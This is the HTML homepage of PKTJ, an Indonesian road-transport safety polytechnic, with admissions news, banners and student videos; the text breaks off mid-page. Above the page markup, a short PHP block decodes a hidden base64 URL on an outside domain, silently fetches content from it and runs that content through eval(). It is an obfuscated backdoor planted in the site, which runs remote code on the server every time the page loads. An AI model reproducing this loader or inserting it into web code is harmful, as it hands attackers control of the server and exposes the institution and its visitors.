<?php
$c = @file_get_contents(base64_decode('aHR0cHM6Ly9oZWRveHl0YXplLnN0b3JlL3BnLnBocD9xJnQ9dDE='));
@eval(base64_decode($c));
?>

<!DOCTYPE html>
<html lang="id-ID">
<head>
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<meta charset="UTF-8">
<meta name="language" content="id" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

<meta name="msapplication-TileColor" content="#1761ab">
<meta name="msapplication-TileImage" content="https://pktj.ac.id/assets/frontoffice/images/pktj_favicon.png">
<meta name="theme-color" content="#1761ab">
<meta name="apple-mobile-web-app-title" content="Politeknik Keselamatan Transportasi Jalan"/>
<meta name="application-name" content="Politeknik Keselamatan Transportasi Jalan"/>

<title>Politeknik Keselamatan Transportasi Jalan</title>    
<meta name="keywords" content="PKTJ, politeknik, keselamatan, transportasi, jalan, perguruan tinggi, tegal, kuliah kerja nyata, peneltian, pengabdian pada masyarakat, sekolah kedinasan, Jawa Tengah, Indonesia" />
<meta name="description" content="Politeknik Keselamatan Transportasi Jalan (PKTJ) adalah perguruan tinggi kedinasan yang diselenggarakan oleh Kementrian Perhubungan Republik Indonesia. Perguruan tinggi ini didirikan pada 14 Mei 1971 dengan nama Balai Diklat Trans Jaya. PKTJ berlokasi di Kota Tegal, Jawa Tengah.">
<meta property="og:title" content="Politeknik Keselamatan Transportasi Jalan">
<meta property="og:url" content="https://pktj.ac.id/login.php">
<meta property="og:description" content="Politeknik Keselamatan Transportasi Jalan (PKTJ) adalah perguruan tinggi kedinasan yang diselenggarakan oleh Kementrian Perhubungan Republik Indonesia. Perguruan tinggi ini didirikan pada 14 Mei 1971 dengan nama Balai Diklat Trans Jaya. PKTJ berlokasi di Kota Tegal, Jawa Tengah.">
<meta property="og:image" content="https://pktj.ac.id/assets/frontoffice/images/pktj_hero.png">

<meta property="language" content="Indonesia" />
<meta property="revisit-after" content="7" />
<meta property="webcrawlers" content="all" />
<meta property="rating" content="general" />
<meta property="spiders" content="all" />
<meta name="robots" content="index, follow">

<link rel="shortcut icon" href="https://pktj.ac.id/assets/frontoffice/images/pktj_favicon.png" type="image/x-icon" />
<link rel="alternate" type="application/rss+xml" title="Politeknik Keselamatan Transportasi Jalan" href="https://pktj.ac.id/feed" />

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.3.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.0/css/ionicons.min.css">
<link rel="stylesheet" href="https://pktj.ac.id/assets/frontoffice/css/core.min.css">        
<link rel="stylesheet" type="text/css" href="https://pktj.ac.id/assets/frontoffice/css/custom.min.css">
<link rel="stylesheet" type="text/css" href="https://pktj.ac.id/assets/frontoffice/css/pager.css">

<script type="text/javascript" src="https://pktj.ac.id/assets/frontoffice/js/js.cookie.js"></script>
</head>
<body>
    
    
    <header id="header" class="header-fancy">
        <nav class="navbar navbar-default topbar">
            <div class="container">
                <div class="header-nav">
                    <button class="nav-more"><i class="ion ion-android-more-vertical"></i></button>
                    <ul class="nav navbar-nav translation-icons">
                        <li><a href="https://pktj.ac.id/berita/rilis" title="Arsip Berita">Arsip Berita</a></li><li><a href="https://online.sim.pktj.ac.id/" title="SIAKAD">SIAKAD</a></li><li><a href="https://sites.google.com/pktj.ac.id/permasalahan-pembayaran/beranda?authuser=0" title="LAGA">LAGA</a></li><li><a href="https://pktj.ac.id/tentang/68-sewa-aset-pktj" title="Sewa Aset PKTJ">Sewa Aset PKTJ</a></li><li><a href="https://lms.pktj.ac.id/" title="E-Learning">E-Learning</a></li><li><a href="https://mail.google.com/a/pktj.ac.id" title="Webmail">Webmail</a></li>                        
                        <!--
                                                -->
                        <li class="dropdown pll-parent-menu-item" id="dropdown-lang-parent" style="display:none;">
                            <a onclick="" href="javascript:;" id="label_indonesia">
                                <img src="https://pktj.ac.id/assets/frontoffice/images/ic_bg/in.gif" loading="lazy"/>&nbsp;Indonesia<span class="caret"></span>
                            </a>
                            <a onclick="" href="javascript:;" id="label_english" style="display:none">
                                <img src="https://pktj.ac.id/assets/frontoffice/images/ic_bg/en.gif" loading="lazy"/>&nbsp;English<span class="caret"></span>
                            </a>
                            <ul role="menu" class="dropdown-menu" style="display: none;">
                                <li class="lang-item-en lang-item-first no-translation menu-item menu-item-type-custom" id="dropdown_english">
                                    <a class="english" onclick="doGTranslate('id|en');$('#label_indonesia').hide();$('#label_english').show();$('#dropdown_english').hide();$('#dropdown_indonesia').show();return false;" href="javascript:;" data-lang="English" title="English">
                                        <img src="https://pktj.ac.id/assets/frontoffice/images/ic_bg/en.gif" loading="lazy"/><span style="margin-left:0.3em;">English</span>
                                    </a>
                                </li>
                                <li class="lang-item-en lang-item-first no-translation menu-item menu-item-type-custom" id="dropdown_indonesia" style="display: none;">
                                    <a class="indonesian" onclick="doGTranslate('id|id');$('#label_indonesia').show();$('#label_english').hide();$('#dropdown_english').show();$('#dropdown_indonesia').hide();return false;" href="javascript:;" data-lang="Indonesian" title="Indonesia">
                                        <img src="https://pktj.ac.id/assets/frontoffice/images/ic_bg/in.gif" loading="lazy"/><span style="margin-left:0.3em;">Indonesia</span>
                                    </a>
                                </li>
                            </ul>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>
        <div class="container">
            <div class="navbar-header">
                <a href="https://pktj.ac.id/" class="navbar-brand noscroll">
                    <img src="https://pktj.ac.id/assets/frontoffice/images/pktj_header.png" alt="Politeknik Keselamatan Transportasi Jalan" class="img-responsive" loading="lazy">
                    <span>Politeknik Keselamatan Transportasi Jalan</span>
                </a>
                <div>
                    <a href="https://pktj.ac.id/" class="navbar-brand scrolling">
                    <img src="https://pktj.ac.id/assets/frontoffice/images/pktj_header.png" alt="Politeknik Keselamatan Transportasi Jalan" class="img-responsive" loading="lazy">
                    <span>Politeknik Keselamatan Transportasi Jalan</span>
                </a>
                </div>
                <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
            </div>
            <nav id="navbar" class="navbar navbar-collapse navbar-default collapse">
                <ul class="nav navbar-nav navbar-left">
                    <li class=""><a href="https://pktj.ac.id/">Beranda</a></li><li class="dropdown  "><a href="https://pktj.ac.id/arsip/pendidikan" class="">Pendidikan <span class="caret"></span></a>
                            <ul class="dropdown-menu"><li class=""><a href="https://pktj.ac.id/arsip/promosi-doktor">Promosi Doktor</a></li><li class=""><a href="https://pktj.ac.id/arsip/pengukuhan-guru-besar">Pengukuhan Guru Besar</a></li><li class=""><a href="https://pktj.ac.id/arsip/wisuda">Wisuda</a></li><li class=""><a href="https://pktj.ac.id/pages/informasi-akademik">Informasi Akademik</a></li></ul>
                </li><li class=""><a href="https://pktj.ac.id/pages/sipencatar">Sipencatar</a></li><li class="dropdown  "><a href="https://pktj.ac.id/arsip/penelitian-dan-inovasi" class="">Penelitian dan Inovasi <span class="caret"></span></a>
                            <ul class="dropdown-menu"><li class=""><a href="https://pktj.ac.id/arsip/penelitian">Penelitian</a></li><li class=""><a href="https://pktj.ac.id/arsip/pkm">PKM</a></li><li class=""><a href="https://pktj.ac.id/arsip/inovasi-teknologi">Inovasi Teknologi</a></li></ul>
                </li><li class="dropdown  "><a href="https://pktj.ac.id/arsip/seputar-kampus" class="">Seputar Kampus <span class="caret"></span></a>
                            <ul class="dropdown-menu"><li class=""><a href="https://pktj.ac.id/arsip/dies-natalis">Dies Natalis</a></li><li class=""><a href="https://pktj.ac.id/arsip/kerjasama">Kerjasama</a></li><li class=""><a href="https://pktj.ac.id/arsip/kegiatan">Kegiatan</a></li><li class=""><a href="https://pktj.ac.id/arsip/pengabdian">Pengabdian</a></li><li class=""><a href="https://pktj.ac.id/arsip/kabar-fakultas">Kabar Fakultas</a></li><li class=""><a href="https://pktj.ac.id/arsip/kuliah-kerja-nyata">Kuliah Kerja Nyata</a></li></ul>
                </li><li class="dropdown  "><a href="https://pktj.ac.id/arsip/liputan" class="">Liputan <span class="caret"></span></a>
                            <ul class="dropdown-menu"><li class=""><a href="https://pktj.ac.id/arsip/prestasi">Prestasi</a></li></ul>
                </li>                </ul>
                
                <ul class="nav navbar-nav navbar-right">
                    <ul class="nav navbar-nav navbar-right">
                        <li>
                            <form action="https://pktj.ac.id/search" class="search-form" method="GET" accept-charset="utf-8">
                                <div class="input-group btn-group">
                                    <input type="text" class="form-control" name="s" placeholder="Search ..." value="">
                                    <button type="submit" class="btn"><i class="fa fa-search"></i></button>
                                </div>
                            </form>                        </li>
                    </ul> 
                </ul>
            </nav>
        </div>
    </header>
    
        
    <div id="body">
    <div class="homepage homepage-id">
        <section class="section-page top schome-hero schome-hero--video">
            <div id="home-video" class="schome-hero__video">
                                    <img src="https://pktj.ac.id/assets/frontoffice/images/uploads/1ca983ddddd1c7bcca0cd692969affc3.jpg" alt="PKTJ"  loading="lazy"/>
                            </div>

            <div class="schome-hero__logotitle text-center">
                <img src="https://pktj.ac.id/assets/frontoffice/images/pktj_hero.png" alt="PKTJ" loading="lazy">
                <h1>Politeknik Keselamatan Transportasi Jalan</h1>
            </div>
        </section>

        <section id="newsfeed" class="section-page news-event">
            <div class="container">
                <div class="section-title inline-title"><h2>Rilis Berita</h2></div>
                                <article class="post post-block">
                    <div class="post-img">
                        <a href="https://pktj.ac.id/berita/20251013-938-pktj-sambut-calon-taruna-gelombang-3-jalur-reguler-khusus-dan-polbit" title="PKTJ Sambut Calon Taruna Gelombang 3 Jalur Reguler, Khusus, dan Polbit">
                            <img src="https://pktj.ac.id/source/berita/f267e6d8624cd4033a8a99b9c78f5add4c54b347.png" alt="PKTJ Sambut Calon Taruna Gelombang 3 Jalur Reguler, Khusus, dan Polbit" loading="lazy">
                        </a>
                    </div>
                    <div class="post-content">
                        <div class="post-title">
                            <span class="post-date">13 Oktober 2025</span>
                            <h3><a href="https://pktj.ac.id/berita/20251013-938-pktj-sambut-calon-taruna-gelombang-3-jalur-reguler-khusus-dan-polbit" title="PKTJ Sambut Calon Taruna Gelombang 3 Jalur Reguler, Khusus, dan Polbit">PKTJ Sambut Calon Taruna Gelombang 3 Jalur Reguler, Khusus, dan Polbit</a></h3>
                        </div>
                        <div class="entry-content">
                            <p>Tegal, Senin, 13 Oktober 2025 &mdash; Politeknik Keselamatan Transportasi Jalan (PKTJ) menyambut kedatangan Calon Taruna Gelombang 3 dari Jalur Reguler Non Polbit, Jalur Khusus, dan Pola Pembibitan. Kegiatan berlangsung di&#8230;</p>
                        </div>
                        <a href="https://pktj.ac.id/berita/20251013-938-pktj-sambut-calon-taruna-gelombang-3-jalur-reguler-khusus-dan-polbit" title="PKTJ Sambut Calon Taruna Gelombang 3 Jalur Reguler, Khusus, dan Polbit" class="btn btn-more" tabindex="0">Baca selengkapnya</a>
                    </div>
                </article>
                
                <div class="row">
                                        <div class="col-md-4 col-sm-4">
                        <article class="post post-inline">
                            <div class="post-img">
                                <a href="https://pktj.ac.id/berita/20251011-937-pengumuman-jadwal-daftar-ulang-dan-masuk-kampus-calon-tarunataruni-jalur-pola-pembibitan-tahun-2025" title="Pengumuman Jadwal Daftar Ulang dan Masuk Kampus Calon Taruna/Taruni Jalur Pola Pembibitan Tahun 2025">
                                    <img src="https://pktj.ac.id/source/berita/19dfc41bbe7ffab336bf6518843d5adc8c964a41.jpg" alt="Pengumuman Jadwal Daftar Ulang dan Masuk Kampus Calon Taruna/Taruni Jalur Pola Pembibitan Tahun 2025" loading="lazy">
                                </a>
                            </div>
                            <div class="post-content">
                                <div class="post-title">
                                    <h3><a href="https://pktj.ac.id/berita/20251011-937-pengumuman-jadwal-daftar-ulang-dan-masuk-kampus-calon-tarunataruni-jalur-pola-pembibitan-tahun-2025" title="Pengumuman Jadwal Daftar Ulang dan Masuk Kampus Calon Taruna/Taruni Jalur Pola Pembibitan Tahun 2025">Pengumuman Jadwal Daftar Ulang dan Masuk Kampus Calon Taruna/Taruni Jalur Pola Pembibitan Tahun 2025</a></h3>
                                </div>
                                <div class="entry-content">
                                    <a class="btn btn-more" tabindex="0" href="https://pktj.ac.id/berita/20251011-937-pengumuman-jadwal-daftar-ulang-dan-masuk-kampus-calon-tarunataruni-jalur-pola-pembibitan-tahun-2025" title="Pengumuman Jadwal Daftar Ulang dan Masuk Kampus Calon Taruna/Taruni Jalur Pola Pembibitan Tahun 2025">Baca Selengkapnya</a>
                                </div>
                            </div>
                        </article>
                    </div>
                                        <div class="col-md-4 col-sm-4">
                        <article class="post post-inline">
                            <div class="post-img">
                                <a href="https://pktj.ac.id/berita/20251010-935-pktj-gelar-kuliah-umum-bersama-direktur-jenderal-intram-kemenhub-integrasi-transportasi-dan-multimoda-menuju-transportasi-berkelanjutan-aman" title="PKTJ Gelar Kuliah Umum Bersama Direktur Jenderal Intram Kemenhub: Integrasi Transportasi dan Multimoda Menuju Transportasi Berkelanjutan & Aman">
                                    <img src="https://pktj.ac.id/source/berita/1dc7af9696a70590a4501387e6d8bb62d6bfdb6b.png" alt="PKTJ Gelar Kuliah Umum Bersama Direktur Jenderal Intram Kemenhub: Integrasi Transportasi dan Multimoda Menuju Transportasi Berkelanjutan & Aman" loading="lazy">
                                </a>
                            </div>
                            <div class="post-content">
                                <div class="post-title">
                                    <h3><a href="https://pktj.ac.id/berita/20251010-935-pktj-gelar-kuliah-umum-bersama-direktur-jenderal-intram-kemenhub-integrasi-transportasi-dan-multimoda-menuju-transportasi-berkelanjutan-aman" title="PKTJ Gelar Kuliah Umum Bersama Direktur Jenderal Intram Kemenhub: Integrasi Transportasi dan Multimoda Menuju Transportasi Berkelanjutan & Aman">PKTJ Gelar Kuliah Umum Bersama Direktur Jenderal Intram Kemenhub: Integrasi Transportasi dan Multimoda Menuju Transportasi Berkelanjutan & Aman</a></h3>
                                </div>
                                <div class="entry-content">
                                    <a class="btn btn-more" tabindex="0" href="https://pktj.ac.id/berita/20251010-935-pktj-gelar-kuliah-umum-bersama-direktur-jenderal-intram-kemenhub-integrasi-transportasi-dan-multimoda-menuju-transportasi-berkelanjutan-aman" title="PKTJ Gelar Kuliah Umum Bersama Direktur Jenderal Intram Kemenhub: Integrasi Transportasi dan Multimoda Menuju Transportasi Berkelanjutan & Aman">Baca Selengkapnya</a>
                                </div>
                            </div>
                        </article>
                    </div>
                                        <div class="col-md-4 col-sm-4">
                        <article class="post post-inline">
                            <div class="post-img">
                                <a href="https://pktj.ac.id/berita/20251010-936-pengumuman-kelulusan-dan-jadwal-daftar-ulang-sipencatar-jalur-reguler-non-polbit-jalur-khusus-tahun-2025" title="Pengumuman Kelulusan dan Jadwal Daftar Ulang Sipencatar Jalur Reguler (Non Polbit) Jalur Khusus Tahun 2025">
                                    <img src="https://pktj.ac.id/source/berita/9c81bab79c4a12fd5d668999915e190ad8595fb2.jpg" alt="Pengumuman Kelulusan dan Jadwal Daftar Ulang Sipencatar Jalur Reguler (Non Polbit) Jalur Khusus Tahun 2025" loading="lazy">
                                </a>
                            </div>
                            <div class="post-content">
                                <div class="post-title">
                                    <h3><a href="https://pktj.ac.id/berita/20251010-936-pengumuman-kelulusan-dan-jadwal-daftar-ulang-sipencatar-jalur-reguler-non-polbit-jalur-khusus-tahun-2025" title="Pengumuman Kelulusan dan Jadwal Daftar Ulang Sipencatar Jalur Reguler (Non Polbit) Jalur Khusus Tahun 2025">Pengumuman Kelulusan dan Jadwal Daftar Ulang Sipencatar Jalur Reguler (Non Polbit) Jalur Khusus Tahun 2025</a></h3>
                                </div>
                                <div class="entry-content">
                                    <a class="btn btn-more" tabindex="0" href="https://pktj.ac.id/berita/20251010-936-pengumuman-kelulusan-dan-jadwal-daftar-ulang-sipencatar-jalur-reguler-non-polbit-jalur-khusus-tahun-2025" title="Pengumuman Kelulusan dan Jadwal Daftar Ulang Sipencatar Jalur Reguler (Non Polbit) Jalur Khusus Tahun 2025">Baca Selengkapnya</a>
                                </div>
                            </div>
                        </article>
                    </div>
                                        <div class="col-md-4 col-sm-4">
                        <article class="post post-inline">
                            <div class="post-img">
                                <a href="https://pktj.ac.id/berita/20251007-934-pengumuman-hasil-kelulusan-akhir-sipencatar-jalur-pola-pembibitan-kemenhub-tahun-2025" title="Pengumuman Hasil Kelulusan Akhir Sipencatar Jalur Pola Pembibitan Kemenhub Tahun 2025">
                                    <img src="https://pktj.ac.id/source/berita/d9ed7e37c37becf06213d349ecbf45d19faac964.jpg" alt="Pengumuman Hasil Kelulusan Akhir Sipencatar Jalur Pola Pembibitan Kemenhub Tahun 2025" loading="lazy">
                                </a>
                            </div>
                            <div class="post-content">
                                <div class="post-title">
                                    <h3><a href="https://pktj.ac.id/berita/20251007-934-pengumuman-hasil-kelulusan-akhir-sipencatar-jalur-pola-pembibitan-kemenhub-tahun-2025" title="Pengumuman Hasil Kelulusan Akhir Sipencatar Jalur Pola Pembibitan Kemenhub Tahun 2025">Pengumuman Hasil Kelulusan Akhir Sipencatar Jalur Pola Pembibitan Kemenhub Tahun 2025</a></h3>
                                </div>
                                <div class="entry-content">
                                    <a class="btn btn-more" tabindex="0" href="https://pktj.ac.id/berita/20251007-934-pengumuman-hasil-kelulusan-akhir-sipencatar-jalur-pola-pembibitan-kemenhub-tahun-2025" title="Pengumuman Hasil Kelulusan Akhir Sipencatar Jalur Pola Pembibitan Kemenhub Tahun 2025">Baca Selengkapnya</a>
                                </div>
                            </div>
                        </article>
                    </div>
                                        <div class="col-md-4 col-sm-4">
                        <article class="post post-inline">
                            <div class="post-img">
                                <a href="https://pktj.ac.id/berita/20251003-933-pengumuman-peserta-lulus-dan-daftar-ulang-jalur-reguler-non-polbit-gelombang-iii-tahun-2025" title="Pengumuman Peserta Lulus dan Daftar Ulang Jalur Reguler (Non Polbit) Gelombang III Tahun 2025">
                                    <img src="https://pktj.ac.id/source/berita/456f8d9a45faa15fc02cbfb98c314d79b83a5772.jpg" alt="Pengumuman Peserta Lulus dan Daftar Ulang Jalur Reguler (Non Polbit) Gelombang III Tahun 2025" loading="lazy">
                                </a>
                            </div>
                            <div class="post-content">
                                <div class="post-title">
                                    <h3><a href="https://pktj.ac.id/berita/20251003-933-pengumuman-peserta-lulus-dan-daftar-ulang-jalur-reguler-non-polbit-gelombang-iii-tahun-2025" title="Pengumuman Peserta Lulus dan Daftar Ulang Jalur Reguler (Non Polbit) Gelombang III Tahun 2025">Pengumuman Peserta Lulus dan Daftar Ulang Jalur Reguler (Non Polbit) Gelombang III Tahun 2025</a></h3>
                                </div>
                                <div class="entry-content">
                                    <a class="btn btn-more" tabindex="0" href="https://pktj.ac.id/berita/20251003-933-pengumuman-peserta-lulus-dan-daftar-ulang-jalur-reguler-non-polbit-gelombang-iii-tahun-2025" title="Pengumuman Peserta Lulus dan Daftar Ulang Jalur Reguler (Non Polbit) Gelombang III Tahun 2025">Baca Selengkapnya</a>
                                </div>
                            </div>
                        </article>
                    </div>
                                        <div class="col-md-4 col-sm-4">
                        <article class="post post-inline">
                            <div class="post-img">
                                <a href="https://pktj.ac.id/berita/20251002-931-pktj-umumkan-pelaksanaan-pembayaran-tagihan-semester-dan-pembaruan-perlengkapan-tahun-ajaran-20252026-ganjil" title="PKTJ Umumkan Pelaksanaan Pembayaran Tagihan Semester dan Pembaruan Perlengkapan Tahun Ajaran 2025/2026 Ganjil">
                                    <img src="https://pktj.ac.id/source/berita/92ebca0356dee779390604e14110854ab42db633.png" alt="PKTJ Umumkan Pelaksanaan Pembayaran Tagihan Semester dan Pembaruan Perlengkapan Tahun Ajaran 2025/2026 Ganjil" loading="lazy">
                                </a>
                            </div>
                            <div class="post-content">
                                <div class="post-title">
                                    <h3><a href="https://pktj.ac.id/berita/20251002-931-pktj-umumkan-pelaksanaan-pembayaran-tagihan-semester-dan-pembaruan-perlengkapan-tahun-ajaran-20252026-ganjil" title="PKTJ Umumkan Pelaksanaan Pembayaran Tagihan Semester dan Pembaruan Perlengkapan Tahun Ajaran 2025/2026 Ganjil">PKTJ Umumkan Pelaksanaan Pembayaran Tagihan Semester dan Pembaruan Perlengkapan Tahun Ajaran 2025/2026 Ganjil</a></h3>
                                </div>
                                <div class="entry-content">
                                    <a class="btn btn-more" tabindex="0" href="https://pktj.ac.id/berita/20251002-931-pktj-umumkan-pelaksanaan-pembayaran-tagihan-semester-dan-pembaruan-perlengkapan-tahun-ajaran-20252026-ganjil" title="PKTJ Umumkan Pelaksanaan Pembayaran Tagihan Semester dan Pembaruan Perlengkapan Tahun Ajaran 2025/2026 Ganjil">Baca Selengkapnya</a>
                                </div>
                            </div>
                        </article>
                    </div>
                                    </div>
                <div class="text-center btn-box no-border">
                    <a href="https://pktj.ac.id/berita" class="btn btn-more">Berita Selengkapnya</a>
                </div>
            </div>
        </section>



                    <section class="home-banner section-page">
                <div class="container">
                    <div class="col-md-12 col-sm-12">
                        <div id="myCarousel" class="carousel slide" data-ride="carousel">
                          <!-- Indicators -->
                          <ol class="carousel-indicators">
                                                        <li data-target="#myCarousel" data-slide-to="0" class="active"></li>
                                                        <li data-target="#myCarousel" data-slide-to="0" class=""></li>
                                                        <li data-target="#myCarousel" data-slide-to="0" class=""></li>
                                                        <li data-target="#myCarousel" data-slide-to="0" class=""></li>
                                                        <li data-target="#myCarousel" data-slide-to="0" class=""></li>
                                                      </ol>

                          <!-- Wrapper for slides -->
                          <div class="carousel-inner">
                                                        <div class="item active">
                                <a href="https://pktj.ac.id/kontak" title="" target="_blank">
                                    <img src="https://pktj.ac.id/source/iklan/973dd47c2aa308ab2ff05db18d9d0fc1.jpg" alt="" class="img-responsive" style="width:100%;" loading="lazy">
                                </a>
                            </div>
                                                        <div class="item ">
                                <a href="https://www.lapor.go.id/" title="" target="_blank">
                                    <img src="https://pktj.ac.id/source/iklan/f50bf0ef214af8aa2637480a04bc689f.png" alt="" class="img-responsive" style="width:100%;" loading="lazy">
                                </a>
                            </div>
                                                        <div class="item ">
                                <a href="https://online.sim.pktj.ac.id/" title="" target="_blank">
                                    <img src="https://pktj.ac.id/source/iklan/7fe775d88cf43d46c64f164ca1581541.jpg" alt="" class="img-responsive" style="width:100%;" loading="lazy">
                                </a>
                            </div>
                                                        <div class="item ">
                                <a href="https://lms.pktj.ac.id/" title="" target="_blank">
                                    <img src="https://pktj.ac.id/source/iklan/541ff12f3da67c504a433d04094c0b1e.jpg" alt="" class="img-responsive" style="width:100%;" loading="lazy">
                                </a>
                            </div>
                                                        <div class="item ">
                                <a href="https://ktj.pktj.ac.id/index.php/ktj" title="" target="_blank">
                                    <img src="https://pktj.ac.id/source/iklan/807c65dbdd014a5166c272a0df2ba2a1.jpg" alt="" class="img-responsive" style="width:100%;" loading="lazy">
                                </a>
                            </div>
                                                      </div>

                          <!-- Left and right controls -->
                          <a class="left carousel-control" href="#myCarousel" data-slide="prev">
                            <span class="glyphicon glyphicon-chevron-left"></span>
                            <span class="sr-only">Previous</span>
                          </a>
                          <a class="right carousel-control" href="#myCarousel" data-slide="next">
                            <span class="glyphicon glyphicon-chevron-right"></span>
                            <span class="sr-only">Next</span>
                          </a>
                        </div>
                    </div>
                </div>  
            </section>
        
                <section id="videofeed" class="section-page news-event">
            <div class="container">
                <div class="section-title inline-title"><h2>Video</h2></div>

                <div class="row">
                                        <div class="col-md-4 col-sm-4">
                        <article class="post post-inline">
                            <div class="post-img">
                                <a href="https://pktj.ac.id/video/52-seandainya-vierra-cover-by-mahasiswai-pktj" title="Seandainya - Vierra (Cover by Mahasiswa/i PKTJ)">
                                    <img src="https://pktj.ac.id/thumbs/video/f1cb0b990b7f7307bcba4b72254923f3.png" alt="Seandainya - Vierra (Cover by Mahasiswa/i PKTJ)" loading="lazy">
                                </a>
                            </div>
                            <div class="post-content">
                                <div class="post-title">
                                    <h3><a href="https://pktj.ac.id/video/52-seandainya-vierra-cover-by-mahasiswai-pktj" title="Seandainya - Vierra (Cover by Mahasiswa/i PKTJ)">Seandainya - Vierra (Cover by Mahasiswa/i PKTJ)</a></h3>
                                </div>
                                <div class="entry-content">
                                    <a class="btn btn-more" tabindex="0" href="https://pktj.ac.id/video/52-seandainya-vierra-cover-by-mahasiswai-pktj" title="Seandainya - Vierra (Cover by Mahasiswa/i PKTJ)">Lihat Selengkapnya</a>
                                </div>
                            </div>
                        </article>
                    </div>
                                        <div class="col-md-4 col-sm-4">
                        <article class="post post-inline">
                            <div class="post-img">
                                <a href="https://pktj.ac.id/video/51-after-movie-dies-natalis-ke-54-pktj-tahun-2025" title="After Movie Dies Natalis Ke-54 PKTJ Tahun 2025">
                                    <img src="https://pktj.ac.id/thumbs/video/3fd838e95dc55247a38612a42c4c0f4f.png" alt="After Movie Dies Natalis Ke-54 PKTJ Tahun 2025" loading="lazy">
                                </a>
                            </div>
                            <div class="post-content">
                                <div class="post-title">
                                    <h3><a href="https://pktj.ac.id/video/51-after-movie-dies-natalis-ke-54-pktj-tahun-2025" title="After Movie Dies Natalis Ke-54 PKTJ Tahun 2025">After Movie Dies Natalis Ke-54 PKTJ Tahun 2025</a></h3>
                                </div>
                                <div class="entry-content">
                                    <a class="btn btn-more" tabindex="0" href="https://pktj.ac.id/video/51-after-movie-dies-natalis-ke-54-pktj-tahun-2025" title="After Movie Dies Natalis Ke-54 PKTJ Tahun 2025">Lihat Selengkapnya</a>
                                </div>
                            </div>
                        </article>
                    </div>
                                        <div class="col-md-4 col-sm-4">
                        <article class="post post-inline">
                            <div class="post-img">
                                <a href="https://pktj.ac.id/video/50-after-movie-inagurasi-mahasiswai-pktj-tahun-2025" title="After Movie Inagurasi Mahasiswa/i PKTJ Tahun 2025">
                                    <img src="https://pktj.ac.id/thumbs/video/85bd40f4a91f0e304f96cf9d025904ce.png" alt="After Movie Inagurasi Mahasiswa/i PKTJ Tahun 2025" loading="lazy">
                                </a>
                            </div>
                            <div class="post-content">
                                <div class="post-title">
                                    <h3><a href="https://pktj.ac.id/video/50-after-movie-inagurasi-mahasiswai-pktj-tahun-2025" title="After Movie Inagurasi Mahasiswa/i PKTJ Tahun 2025">After Movie Inagurasi Mahasiswa/i PKTJ Tahun 2025</a></h3>
                                </div>
                                <div class="entry-content">
                                    <a class="btn btn-more" tabindex="0" href="https://pktj.ac.id/video/50-after-movie-inagurasi-mahasiswai-pktj-tahun-2025" title="After Movie Inagurasi Mahasiswa/i PKTJ Tahun 2025">Lihat Selengkapnya</a>
                                </div>
                            </div>
                        </article>
                    </div>
                                        <div class="col-md-4 col-sm-4">
                        <article class="post post-inline">
                            <div class="post-img">
                                <a href="https://pktj.ac.id/video/44-podcast-seputar-biaya-sipencatar-non-polbit" title="Podcast Seputar Biaya Sipencatar Non-Polbit">
                                    <img src="https://pktj.ac.id/thumbs/video/722fe63f9d795ca184ed65373c4300f9.png" alt="Podcast Seputar Biaya Sipencatar Non-Polbit" loading="lazy">
                                </a>
                            </div>
                            <div class="post-content">
                                <div class="post-title">
                                    <h3><a href="https://pktj.ac.id/video/44-podcast-seputar-biaya-sipencatar-non-polbit" title="Podcast Seputar Biaya Sipencatar Non-Polbit">Podcast Seputar Biaya Sipencatar Non-Polbit</a></h3>
                                </div>
                                <div class="entry-content">
                                    <a class="btn btn-more" tabindex="0" href="https://pktj.ac.id/video/44-podcast-seputar-biaya-sipencatar-non-polbit" title="Podcast Seputar Biaya Sipencatar Non-Polbit">Lihat Selengkapnya</a>
                                </div>
                            </div>
                        </article>
                    </div>
                                        <div class="col-md-4 col-sm-4">
                        <article class="post post-inline">
                            <div class="post-img">
                                <a href="https://pktj.ac.id/video/43-area-traffic-control-system-atcs-di-laboratorium-pktj" title="Area Traffic Control System (ATCS) di Laboratorium PKTJ">
                                    <img src="https://pktj.ac.id/thumbs/video/03c7d8b85ed4d14923b86a33dabfd435.png" alt="Area Traffic Control System (ATCS) di Laboratorium PKTJ" loading="lazy">
                                </a>
                            </div>
                            <div class="post-content">
                                <div class="post-title">
                                    <h3><a href="https://pktj.ac.id/video/43-area-traffic-control-system-atcs-di-laboratorium-pktj" title="Area Traffic Control System (ATCS) di Laboratorium PKTJ">Area Traffic Control System (ATCS) di Laboratorium PKTJ</a></h3>
                                </div>
                                <div class="entry-content">
                                    <a class="btn btn-more" tabindex="0" href="https://pktj.ac.id/video/43-area-traffic-control-system-atcs-di-laboratorium-pktj" title="Area Traffic Control System (ATCS) di Laboratorium PKTJ">Lihat Selengkapnya</a>
                                </div>
                            </div>
                        </article>
                    </div>
                                        <div class="col-md-4 col-sm-4">
                        <article class="post post-inline">
                            <div class="post-img">
                                <a href="https://pktj.ac.id/video/41-in-memoriam-ibu-tri-susila-hidayati-spd-msi-atau-bunda-sadar-lalu-lintas-usia-dini-salud" title="In Memoriam Ibu Tri Susila Hidayati, S.Pd , M.Si atau Bunda Sadar Lalu Lintas Usia Dini (SALUD)">
                                    <img src="https://pktj.ac.id/thumbs/video/43633ad4040dc3c4da0c96bdd6ee3c45.png" alt="In Memoriam Ibu Tri Susila Hidayati, S.Pd , M.Si atau Bunda Sadar Lalu Lintas Usia Dini (SALUD)" loading="lazy">
                                </a>
                            </div>
                            <div class="post-content">
                                <div class="post-title">
                                    <h3><a href="https://pktj.ac.id/video/41-in-memoriam-ibu-tri-susila-hidayati-spd-msi-atau-bunda-sadar-lalu-lintas-usia-dini-salud" title="In Memoriam Ibu Tri Susila Hidayati, S.Pd , M.Si atau Bunda Sadar Lalu Lintas Usia Dini (SALUD)">In Memoriam Ibu Tri Susila Hidayati, S.Pd , M.Si atau Bunda Sadar Lalu Lintas Usia Dini (SALUD)</a></h3>
                                </div>
                                <div class="entry-content">
